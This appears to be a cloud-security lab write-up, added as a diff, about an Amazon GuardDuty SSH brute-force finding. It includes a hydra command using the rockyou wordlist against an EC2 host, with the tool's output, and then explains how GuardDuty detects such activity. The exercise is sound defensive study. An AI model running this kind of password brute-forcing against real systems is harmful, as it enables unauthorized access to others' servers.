@@ -1,0 +1,28 @@
+# Describe GuardDuty findings that were detected related to the brute force attack
+
+i-0cf791d47ba433285 is performing SSH brute force attacks against 10.192.10.222. Brute force attacks are used to gain unauthorized access to your instance by guessing the SSH password
+5 attempts done.
+
+ubuntu@ip-10-192-11-45:~$ hydra -l ubuntu -P rockyou.txt ssh://ec2-3-220-42-119.compute-1.amazonaws.com
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2020-10-04 12:54:36
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
+[DATA] attacking ssh://ec2-3-220-42-119.compute-1.amazonaws.com:22/
+[STATUS] 259.00 tries/min, 259 tries in 00:01h, 14344144 to do in 923:03h, 16 active
+[STATUS] 246.33 tries/min, 739 tries in 00:03h, 14343664 to do in 970:29h, 16 active
+[STATUS] 242.71 tries/min, 1699 tries in 00:07h, 14342704 to do in 984:53h, 16 active
+[STATUS] 241.33 tries/min, 3620 tries in 00:15h, 14340784 to do in 990:24h, 16 active
+[STATUS] 240.29 tries/min, 7449 tries in 00:31h, 14336955 to do in 994:26h, 16 active
+
+# Research the AWS Guard Duty documentation page and explain how GuardDuty may have detected this attack - i.e. what was its source of information.
+
+Amazon GuardDuty is a continuous security monitoring service that analyzes and processes the following Data sources: VPC Flow Logs, AWS CloudTrail 
+management event logs, Cloudtrail S3 data event logs, and DNS logs. It uses threat intelligence feeds, such as lists of malicious IP addresses and 
+domains, and machine learning to identify unexpected and potentially unauthorized and malicious activity within your AWS environment. This can include 
+issues like escalations of privileges, uses of exposed credentials, or communication with malicious IP addresses, URLs, or domains. For example, GuardDuty 
+can detect compromised EC2 instances serving malware or mining bitcoin. It also monitors AWS account access behavior for signs of compromise, such as unauthorized 
+infrastructure deployments, like instances deployed in a Region that has never been used, or unusual API calls, like a password policy change to reduce password 
+strength. 
